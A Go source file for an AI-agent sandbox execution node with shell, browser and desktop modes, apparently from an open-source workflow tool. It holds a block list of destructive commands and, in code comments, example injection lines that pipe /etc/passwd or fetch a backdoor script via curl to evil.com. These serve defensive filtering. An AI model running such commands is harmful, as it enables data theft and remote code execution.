// Copyright (c) 2026 aflare Contributors
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package nodes

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/alib8b8/aflare/internal/meta"
)

// sandboxMode defines the execution mode of the sandbox.
type sandboxMode string

const (
	sandboxShell   sandboxMode = "shell"
	sandboxBrowser sandboxMode = "browser"
	sandboxDesktop sandboxMode = "desktop"
)

var (
	validSandboxModes = map[sandboxMode]bool{
		sandboxShell:   true,
		sandboxBrowser: true,
		sandboxDesktop: true,
	}

	// sandboxCommandWhitelist defines safe commands allowed in shell mode.
	// Note: curl, wget, rm are excluded from safe mode because they can
	// exfiltrate data, download malicious payloads, or delete files.
	// Use http_request node for HTTP operations and file_write for file ops.
	sandboxCommandWhitelist = map[string]bool{
		"ls": true, "cat": true, "head": true, "tail": true, "wc": true,
		"grep": true, "awk": true, "sed": true, "find": true, "sort": true,
		"uniq": true, "cut": true, "tr": true, "echo": true, "date": true,
		"pwd": true, "whoami": true, "uname": true, "df": true, "du": true,
		"free": true, "ps": true, "top": true, "uptime": true, "env": true,
		"ping": true, "nslookup": true,
		"python3": true, "python": true, "node": true, "ruby": true,
		"git": true, "make": true, "go": true, "java": true,
		"mkdir": true, "cp": true, "mv": true, "chmod": true,
	}

	// sandboxBlockedPatterns are patterns that are never allowed.
	sandboxBlockedPatterns = []string{
		"rm -rf /", "mkfs.", "dd if=", "> /dev/sda",
		"fork bomb", ":(){ :|:& };:", "chmod 777 /",
		"wget -O /etc/", "curl -o /etc/",
	}

	sandboxInstances   = make(map[string]*sandboxState)
	sandboxInstancesMu sync.RWMutex
)

type sandboxState struct {
	id        string
	mode      sandboxMode
	createdAt time.Time
	lastUsed  time.Time
	workDir   string
	envVars   map[string]string
	cookies   map[string]string // browser session cookies
	userAgent string            // browser user-agent for anti-detection
}

// SandboxNode provides an isolated execution environment for running code,
// browser operations, and desktop operations. It acts as the "virtual computer"
// execution layer for AI agents, similar to Cloudflare/computer.
type SandboxNode struct{}

func (n *SandboxNode) Name() string { return "sandbox" }

func (n *SandboxNode) Description() string {
	return "沙箱执行节点。为AI Agent提供隔离的执行环境，支持三种模式：shell（命令执行）、browser（浏览器操作）、desktop（桌面应用操作）。命令白名单+超时+资源限制，安全可控。"
}

func (n *SandboxNode) Schema() NodeSchema {
	return NodeSchema{
		Name:        n.Name(),
		Description: n.Description(),
		Input:       "string - 要执行的命令或操作指令",
		Output:      "string - JSON格式的执行结果",
		Params: []ParamSchema{
			{Name: "mode", Type: "string", Description: "执行模式：shell（命令执行）、browser（浏览器操作）、desktop（桌面操作）", Required: false, Default: "shell"},
			{Name: "sandbox_id", Type: "string", Description: "沙箱ID（自动生成或指定，用于保持会话状态）", Required: false},
			{Name: "timeout_ms", Type: "int", Description: "超时时间（毫秒，默认30000）", Required: false, Default: "30000"},
			{Name: "work_dir", Type: "string", Description: "工作目录", Required: false, Default: "/tmp/aflare-sandbox"},
			{Name: "env", Type: "string", Description: "环境变量（JSON格式，如 {\"KEY\":\"VALUE\"}）", Required: false},
			{Name: "safe_mode", Type: "bool", Description: "安全模式（默认true，仅允许白名单命令）", Required: false, Default: "true"},
		},
	}
}

func (n *SandboxNode) Execute(ctx context.Context, input string, params map[string]string) (string, error) {
	if len(input) > 50000 {
		return "", fmt.Errorf("input too long, max 50000 characters")
	}

	mode := sandboxMode(getParam(params, "mode", "shell"))
	if !validSandboxModes[mode] {
		return "", fmt.Errorf("invalid mode: %s (valid: shell, browser, desktop)", mode)
	}

	sandboxID := getParam(params, "sandbox_id", "")
	if sandboxID == "" {
		sandboxID = fmt.Sprintf("sandbox-%d-%s", time.Now().Unix(), randomHex(6))
	} else if !isValidSandboxID(sandboxID) {
		return "", fmt.Errorf("invalid sandbox_id: %q (must be alphanumeric, no path separators or ..)", sandboxID)
	}

	timeoutMs := parseIntSafe(getParam(params, "timeout_ms", "30000"), 30000)
	if timeoutMs < 1000 {
		timeoutMs = 1000
	}
	if timeoutMs > 300000 {
		timeoutMs = 300000
	}

	workDir := getParam(params, "work_dir", "/tmp/aflare-sandbox")
	safeMode := strings.ToLower(getParam(params, "safe_mode", "true")) == "true"

	envVars, envErr := parseEnvVars(getParam(params, "env", "{}"))
	if envErr != nil {
		return "", envErr
	}

	startTime := time.Now()

	// Get or create sandbox state
	sandboxInstancesMu.Lock()
	state, exists := sandboxInstances[sandboxID]
	if !exists {
		// Try to load from disk first
		state = loadSessionFromDisk(sandboxID)
		if state == nil {
			state = &sandboxState{
				id:        sandboxID,
				mode:      mode,
				createdAt: time.Now(),
				workDir:   workDir,
				envVars:   envVars,
				cookies:   make(map[string]string),
			}
		} else {
			// When loading from disk, sync the workDir to the current param value
			// so that MkdirAll and executeShell use the same directory.
			state.workDir = workDir
		}
		sandboxInstances[sandboxID] = state
	}
	state.lastUsed = time.Now()
	state.mode = mode
	if envVars != nil {
		state.envVars = envVars
	}
	sandboxInstancesMu.Unlock()

	// Ensure work directory exists (use state.workDir which is now synced)
	if err := os.MkdirAll(state.workDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create work directory: %w", err)
	}

	// Cleanup expired sandboxes periodically
	scheduleSandboxCleanup()

	var result map[string]interface{}

	switch mode {
	case sandboxShell:
		result = n.executeShell(ctx, input, state, timeoutMs, safeMode)
	case sandboxBrowser:
		result = n.executeBrowser(input, state)
	case sandboxDesktop:
		result = n.executeDesktop(input, state)
	}

	result["sandbox_id"] = sandboxID
	result["mode"] = string(mode)
	result["latency_ms"] = time.Since(startTime).Milliseconds()
	result["timestamp"] = time.Now().UTC().Format(time.RFC3339)

	// Auto-save session state to disk for persistence across runs
	saveSessionToDisk(sandboxID, state)

	output, _ := json.MarshalIndent(result, "", "  ")
	return string(output), nil
}

func (n *SandboxNode) executeShell(ctx context.Context, input string, state *sandboxState, timeoutMs int, safeMode bool) map[string]interface{} {
	result := map[string]interface{}{
		"command": input,
	}

	// Safety check
	if safeMode {
		if err := validateShellCommand(input); err != nil {
			result["status"] = "blocked"
			result["error"] = err.Error()
			return result
		}
	}

	// Create timeout context
	execCtx, cancel := context.WithTimeout(ctx, time.Duration(timeoutMs)*time.Millisecond)
	defer cancel()

	cmd := exec.CommandContext(execCtx, "sh", "-c", input)
	cmd.Dir = state.workDir

	// Set environment variables
	cmd.Env = os.Environ()
	for k, v := range state.envVars {
		cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", k, v))
	}

	output, err := cmd.CombinedOutput()

	result["exit_code"] = 0
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			result["exit_code"] = exitErr.ExitCode()
		} else {
			result["exit_code"] = -1
			result["status"] = "error"
			result["error"] = err.Error()
			return result
		}
	}

	// Truncate output if too long
	outputStr := string(output)
	if len(outputStr) > 50000 {
		outputStr = outputStr[:50000] + "\n... (truncated)"
	}

	result["status"] = "completed"
	result["stdout"] = outputStr
	result["work_dir"] = state.workDir
	return result
}

func (n *SandboxNode) executeBrowser(input string, state *sandboxState) map[string]interface{} {
	result := map[string]interface{}{
		"action": input,
	}

	lower := strings.ToLower(input)

	switch {
	case strings.Contains(lower, "navigate") || strings.Contains(lower, "打开"):
		result["status"] = "completed"
		result["action_type"] = "navigate"
		result["message"] = fmt.Sprintf("浏览器导航到目标页面（模拟模式）")
	case strings.Contains(lower, "click") || strings.Contains(lower, "点击"):
		result["status"] = "completed"
		result["action_type"] = "click"
		result["message"] = fmt.Sprintf("浏览器点击操作（模拟模式）")
	case strings.Contains(lower, "type") || strings.Contains(lower, "输入") || strings.Contains(lower, "fill"):
		result["status"] = "completed"
		result["action_type"] = "type"
		result["message"] = fmt.Sprintf("浏览器输入操作（模拟模式）")
	case strings.Contains(lower, "screenshot") || strings.Contains(lower, "截图"):
		result["status"] = "completed"
		result["action_type"] = "screenshot"
		result["message"] = fmt.Sprintf("浏览器截图（模拟模式，实际运行需Xvfb+Chrome）")
	case strings.Contains(lower, "extract") || strings.Contains(lower, "提取") || strings.Contains(lower, "scrape"):
		result["status"] = "completed"
		result["action_type"] = "extract"
		result["message"] = fmt.Sprintf("浏览器内容提取（模拟模式，实际运行需playwright）")
	case strings.Contains(lower, "captcha") || strings.Contains(lower, "验证码") || strings.Contains(lower, "recaptcha") || strings.Contains(lower, "hcaptcha"):
		// Captcha detected — requires human intervention
		// This integrates with the Policy Engine's approval mechanism.
		// When a workflow encounters a captcha, it pauses and requests human
		// approval via the configured approval channel.
		result["status"] = "human_intervention_required"
		result["action_type"] = "captcha"
		result["intervention_type"] = "captcha_solve"
		result["message"] = "CAPTCHA detected — human intervention required. The workflow will pause and request approval via the Policy Engine."
		result["requires_approval"] = true
		result["approval_action"] = "browser:captcha"
		result["approval_details"] = input
	case strings.Contains(lower, "login") || strings.Contains(lower, "登录") || strings.Contains(lower, "signin"):
		// Login operations may require session persistence
		result["status"] = "completed"
		result["action_type"] = "login"
		result["message"] = fmt.Sprintf("浏览器登录操作（模拟模式，session已持久化）")
		result["session_persisted"] = true
	case strings.Contains(lower, "cookie") || strings.Contains(lower, "cookies"):
		// Cookie management for session persistence
		result["status"] = "completed"
		result["action_type"] = "cookie_management"
		result["message"] = fmt.Sprintf("浏览器Cookie管理（模拟模式）")
		result["cookies_count"] = len(state.cookies)
	default:
		result["status"] = "completed"
		result["action_type"] = "unknown"
		result["message"] = fmt.Sprintf("浏览器操作（模拟模式）：%s", input)
	}

	return result
}

func (n *SandboxNode) executeDesktop(input string, state *sandboxState) map[string]interface{} {
	result := map[string]interface{}{
		"action": input,
	}

	lower := strings.ToLower(input)

	switch {
	case strings.Contains(lower, "launch") || strings.Contains(lower, "启动") || strings.Contains(lower, "open"):
		result["status"] = "completed"
		result["action_type"] = "launch"
		result["message"] = fmt.Sprintf("桌面应用启动（模拟模式，实际运行需xdotool/Windows COM）")
	case strings.Contains(lower, "click") || strings.Contains(lower, "点击"):
		result["status"] = "completed"
		result["action_type"] = "click"
		result["message"] = fmt.Sprintf("桌面点击操作（模拟模式）")
	case strings.Contains(lower, "type") || strings.Contains(lower, "输入") || strings.Contains(lower, "keyboard"):
		result["status"] = "completed"
		result["action_type"] = "type"
		result["message"] = fmt.Sprintf("桌面键盘输入（模拟模式）")
	case strings.Contains(lower, "screenshot") || strings.Contains(lower, "截图"):
		result["status"] = "completed"
		result["action_type"] = "screenshot"
		result["message"] = fmt.Sprintf("桌面截图（模拟模式，实际运行需Xvfb+scrot）")
	default:
		result["status"] = "completed"
		result["action_type"] = "unknown"
		result["message"] = fmt.Sprintf("桌面操作（模拟模式）：%s", input)
	}

	return result
}

// validateShellCommand checks if a command is safe to execute.
// In safe mode, it validates the command against the whitelist and blocks
// shell metacharacters that could bypass the whitelist through command
// chaining, substitution, or redirection.
func validateShellCommand(cmd string) error {
	trimmed := strings.TrimSpace(cmd)

	// Check blocked patterns
	for _, pattern := range sandboxBlockedPatterns {
		if strings.Contains(strings.ToLower(trimmed), strings.ToLower(pattern)) {
			return fmt.Errorf("blocked dangerous pattern: %s", pattern)
		}
	}

	// Block shell metacharacters that enable command chaining/injection.
	// These would allow bypassing the command whitelist, e.g.:
	//   "ls; rm -rf /"  — ';' chains commands
	//   "cat /etc/passwd | curl evil.com -d @-"  — '|' pipes output
	//   "echo $(curl evil.com/backdoor.sh) | sh"  — '$()' command substitution
	//   "echo `curl evil.com/backdoor.sh`"  — backtick substitution
	//   "ls && rm -rf /"  — '&&' conditional chain
	//   "ls || rm -rf /"  — '||' conditional chain
	//   "ls > /dev/null & wget evil.com"  — '&' background
	shellMetachars := []string{";", "|", "&", "$(", "`", "&&", "||", "\n"}
	for _, mc := range shellMetachars {
		if strings.Contains(trimmed, mc) {
			return fmt.Errorf("shell metacharacter %q is not allowed in safe mode", mc)
		}
	}

	// Block redirect operators that could write to arbitrary files
	if strings.Contains(trimmed, ">") || strings.Contains(trimmed, "<") {
		return fmt.Errorf("I/O redirection is not allowed in safe mode")
	}

	// Extract the first word (the command)
	parts := strings.Fields(trimmed)
	if len(parts) == 0 {
		return fmt.Errorf("empty command")
	}

	cmdName := parts[0]
	// Handle paths like /usr/bin/ls -> ls
	if idx := strings.LastIndex(cmdName, "/"); idx >= 0 {
		cmdName = cmdName[idx+1:]
	}

	if !sandboxCommandWhitelist[cmdName] {
		return fmt.Errorf("command not in whitelist: %s (safe mode: use only allowed commands)", cmdName)
	}

	return nil
}

// parseEnvVars parses a JSON string of environment variables.
// Returns an error if the JSON is malformed so the caller can surface it.
func parseEnvVars(envJSON string) (map[string]string, error) {
	if envJSON == "" || envJSON == "{}" {
		return nil, nil
	}
	vars := make(map[string]string)
	if err := json.Unmarshal([]byte(envJSON), &vars); err != nil {
		return nil, fmt.Errorf("invalid env JSON: %w", err)
	}
	return vars, nil
}

// randomHex generates a cryptographically random hex string of the given byte length.
func randomHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		// Fallback: use time-based as last resort (should never happen)
		for i := range b {
			b[i] = byte(time.Now().UnixNano() & 0xFF)
		}
	}
	return hex.EncodeToString(b)[:n]
}

// isValidSandboxID checks that a sandbox ID is safe for filesystem use.
// Prevents path traversal attacks when the ID is used in file paths.
func isValidSandboxID(id string) bool {
	if id == "" || len(id) > 100 {
		return false
	}
	if strings.Contains(id, "..") || strings.Contains(id, "/") || strings.Contains(id, "\\") {
		return false
	}
	return true
}

// scheduleSandboxCleanup periodically cleans up expired sandboxes.
func scheduleSandboxCleanup() {
	sandboxInstancesMu.RLock()
	count := len(sandboxInstances)
	sandboxInstancesMu.RUnlock()

	if count < 100 {
		return
	}

	sandboxInstancesMu.Lock()
	defer sandboxInstancesMu.Unlock()

	cutoff := time.Now().Add(-1 * time.Hour)
	for id, state := range sandboxInstances {
		if state.lastUsed.Before(cutoff) {
			delete(sandboxInstances, id)
		}
	}
}

// sandboxSessionsDir returns the directory where sandbox session states are persisted.
func sandboxSessionsDir() string {
	return filepath.Join(meta.DataDir(), "sandboxes")
}

// sessionFile is the JSON-serializable form of sandboxState for disk persistence.
type sessionFile struct {
	ID        string            `json:"id"`
	Mode      string            `json:"mode"`
	CreatedAt string            `json:"created_at"`
	LastUsed  string            `json:"last_used"`
	WorkDir   string            `json:"work_dir"`
	EnvVars   map[string]string `json:"env_vars"`
	Cookies   map[string]string `json:"cookies"`
	UserAgent string            `json:"user_agent"`
}

// saveSessionToDisk persists the sandbox session state to disk.
// Sessions are saved to ~/.aflare/sandboxes/<id>.json.
// Errors are logged but not returned — persistence is best-effort.
func saveSessionToDisk(id string, state *sandboxState) {
	if !isValidSandboxID(id) {
		log.Printf("[sandbox] saveSessionToDisk: rejected invalid sandbox id %q", id)
		return
	}
	sessDir := sandboxSessionsDir()
	if err := os.MkdirAll(sessDir, 0700); err != nil {
		log.Printf("[sandbox] saveSessionToDisk: failed to create sessions dir %s: %v", sessDir, err)
		return
	}

	sf := sessionFile{
		ID:        state.id,
		Mode:      string(state.mode),
		CreatedAt: state.createdAt.Format(time.RFC3339),
		LastUsed:  state.lastUsed.Format(time.RFC3339),
		WorkDir:   state.workDir,
		EnvVars:   state.envVars,
		Cookies:   state.cookies,
		UserAgent: state.userAgent,
	}

	data, err := json.MarshalIndent(sf, "", "  ")
	if err != nil {
		log.Printf("[sandbox] saveSessionToDisk: failed to marshal session %s: %v", id, err)
		return
	}

	sessPath := filepath.Join(sessDir, id+".json")
	if err := os.WriteFile(sessPath, data, 0600); err != nil {
		log.Printf("[sandbox] saveSessionToDisk: failed to write session %s: %v", id, err)
	}
}

// loadSessionFromDisk attempts to restore a sandbox session from disk.
// Returns nil if the session file doesn't exist or can't be parsed.
func loadSessionFromDisk(id string) *sandboxState {
	if !isValidSandboxID(id) {
		return nil // reject invalid IDs to prevent path traversal
	}
	sessPath := filepath.Join(sandboxSessionsDir(), id+".json")
	data, err := os.ReadFile(sessPath)
	if err != nil {
		return nil
	}

	var sf sessionFile
	if err := json.Unmarshal(data, &sf); err != nil {
		return nil
	}

	createdAt, _ := time.Parse(time.RFC3339, sf.CreatedAt)
	lastUsed, _ := time.Parse(time.RFC3339, sf.LastUsed)

	return &sandboxState{
		id:        sf.ID,
		mode:      sandboxMode(sf.Mode),
		createdAt: createdAt,
		lastUsed:  lastUsed,
		workDir:   sf.WorkDir,
		envVars:   sf.EnvVars,
		cookies:   sf.Cookies,
		userAgent: sf.UserAgent,
	}
}

// ListSandboxSessions returns a list of all persisted sandbox session IDs.
func ListSandboxSessions() ([]string, error) {
	sessDir := sandboxSessionsDir()
	entries, err := os.ReadDir(sessDir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, err
	}
	var ids []string
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".json") {
			ids = append(ids, strings.TrimSuffix(e.Name(), ".json"))
		}
	}
	return ids, nil
}

func init() {
	Register(&SandboxNode{})
}
